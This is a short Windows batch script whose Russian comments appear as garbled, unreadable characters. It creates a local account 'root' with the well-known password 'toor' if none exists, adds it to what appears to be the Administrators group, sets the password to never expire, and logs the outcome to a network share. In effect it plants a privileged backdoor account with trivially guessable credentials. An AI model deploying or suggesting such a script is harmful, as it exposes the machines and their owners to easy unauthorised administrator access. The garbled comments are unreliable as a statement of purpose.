@ echo off
rem �஢��塞 ���� �� ���짮��⥫� "root" �� ��������
net user root toor 2>nul
rem �᫨ ���, ᮧ���� ���짮��⥫� "root" � ��஫�� "toor", ������塞 � ��㯯� "������������", �⠢�� ������ "��஫� ������� �� ��⥪���", ��襬 ���.  
If %ErrorLevel% Neq 0 (
net user root toor /add /expires:never /fullname:root
net localgroup "������������" root /add 
wmic path Win32_Useraccount where Name='root' set passwordexpires=false /nointeractive
echo %date% %time:~-11,8% user "Root" created successfully >> \\�ࢥ�\�����_���_�����\%username%.txt
exit
)
rem �᫨ ���짮��⥫� "root" 㦥 ������� ��襬 �� �⮬ � ��� � ��室�� �� �ணࠬ��.
echo %date% %time:~-11,8% user "Root" exist already >> \\�ࢥ�\�����_���_�����\%username%.txt
exit